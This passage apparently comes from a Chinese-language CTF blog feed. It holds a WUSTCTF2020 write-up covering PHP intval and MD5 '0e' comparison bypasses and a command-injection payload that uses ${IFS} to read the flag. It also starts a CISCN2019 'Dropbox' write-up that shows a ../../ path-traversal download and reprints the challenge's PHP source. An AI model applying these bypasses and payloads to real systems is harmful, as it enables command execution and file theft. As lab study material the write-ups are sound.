且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现有三个等级，第一关是intval：</p>
<p>去查了一下这个函数：</p>
<p><img src="/2022/02/28/%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/5.png" alt="4"></p>
<p>可以看到，当我们输入的是一个字符串的科学计数法时，因为php是弱指令，她会自动判定成首位的数字，而当他变成数字时又会完整输出，我们知道php是一个弱指令语言，所以当他在遇到运算符之后会更改类型，也就是说’1e10’在加1之后会变成int类型</p>
<p>回到题目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以构造科学计数法绕过，2e4是20000但是在前面会被判定成2，加1之后改变类型绕过成功绕过if</p>
<p>（这个方法只有在php5版本可以使用）</p>
<p>第二层是MD5比较</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line"><span class="meta">   $</span><span class="bash">md5=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span></span><br><span class="line">   if ($md5==md5($md5))</span><br><span class="line">       echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">   else</span><br><span class="line">       die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们需要构造一个MD5上传，使他在MD5前后都相等，也就是说，我们需要找到0e开头的MD5数因为我们知道0e开头的数会被判定成0</p>
<p>找了很多资料也没找到0e开头的，最后找到了一个0e215962017，成功绕过</p>
<p>进入第三层，终于可以拿到flag了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;wctf2020&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们需要传入一个get_flag参数，函数中不能有空格，否则会直接退出</p>
<p>第二个if判断，我们输入的参数中不能含有cat，如果含有cat则将其替换成wctf2020</p>
<p>我们用${IFS}来绕过空格，最后构造</p>
<p><code>tail$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p>就可以拿到flag</p>
<p>最终payload:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=tail$&#123;IFS&#125;fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>WUSTCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Dropbox</title>
    <url>/2022/02/28/Dropbox/</url>
    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>进入页面是一个登录框</p>
<p>先注册一下</p>
<p><img src="/2022/02/28/Dropbox/1.png" alt="1"></p>
<p>直接注册admin</p>
<p>发现成功，admin没有注册可能漏洞在别的地方</p>
<p><img src="/2022/02/28/Dropbox/2.png" alt="1"></p>
<p>随便写一些上传</p>
<p><img src="/2022/02/28/Dropbox/3.png" alt="1"></p>
<p>可以发现只可以上传gif等图片格式</p>
<p><img src="/2022/02/28/Dropbox/4.png" alt="1"></p>
<p>然后又发现了两个页面：delete、download</p>
<p>删除没什么用，但是这个下载，可能藏着漏洞</p>
<p>抓个包看一下</p>
<p><img src="/2022/02/28/Dropbox/5.png" alt="1"></p>
<p>可以看到我们刚刚上传的1.png可以下载，看看能不能下载别的东西，猜测一下index文件应该在下载文件的上上层的目录里面，那么就构造../../index.php</p>
<p><img src="/2022/02/28/Dropbox/6.png" alt="1"></p>
<p>可以看到存在任意文件下载漏洞，我们可以把文件下载下来看一看，测试了一下download、delete、index、register、login页面都可以正常下载</p>
<p>但是flag是下载不了的，应该是过滤了flag字符啥的，那么我们来分析一下代码</p>
<p>register.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123; <span class="comment">#如果新注册了一个用户，那么她会重新实例一个User对象，并且将账户信息传递给他</span></span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; strlen(<span class="variable">$username</span>) &gt; <span class="number">2</span> &amp;&amp; strlen(<span class="variable">$password</span>) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$u</span>-&gt;add_user(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;				<span class="comment">#对创建的文件名还有密码进行过滤</span></span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;login.php?register&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;此用户名已被使用&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;请输入有效用户名和密码&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#如果已经登录，那么进行下面的内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;<span class="comment">#包含了class.php中的内容</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);<span class="comment">#新创建一个FileList对象</span></span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中包含了一个class、login页面，一起跟进一下</p>
<p>login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;register&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;注册成功&#x27;, &#x27;info&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$username</span>) &lt; <span class="number">20</span> &amp;&amp; <span class="variable">$u</span>-&gt;verify_user(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = htmlentities(<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$sandbox</span> = <span class="string">&quot;uploads/&quot;</span> . sha1(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot;sftUahRiTz&quot;</span>) . <span class="string">&quot;/&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir(<span class="variable">$sandbox</span>)) &#123;</span><br><span class="line">            mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>] = <span class="variable">$sandbox</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;index.php&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;toast(&#x27;账号或密码错误&#x27;, &#x27;warning&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，在上面三个页面中，都会进行一个判定是否已经登录，还有注册，注册时候的判定等，这里好像没什么漏洞可以利用</p>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class是整个网站的执行功能的实现，前面都没有什么漏洞，那么大概率漏洞会存在这里</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">dbuser = <span class="string">&quot;root&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbpass = <span class="string">&quot;root&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">dbname = <span class="string">&quot;dropbox&quot;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">db = new mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span></span><br></pre></td></tr></table></figure>

<p>在这个地方的开头定义了mysql数据库的链接信息并且是以root权限的，数据库操作使用了预编译，所以没什么地方可以利用</p>
<p>接下来继续看</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;#构造方法（在类的最开头使用）</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function user_exist($username) &#123;	#查询用户是否存在</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        if ($count === 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function add_user($username, $password) &#123;#添加用户</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function verify_user($username, $password) &#123;#判断用户密码是否正确</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = 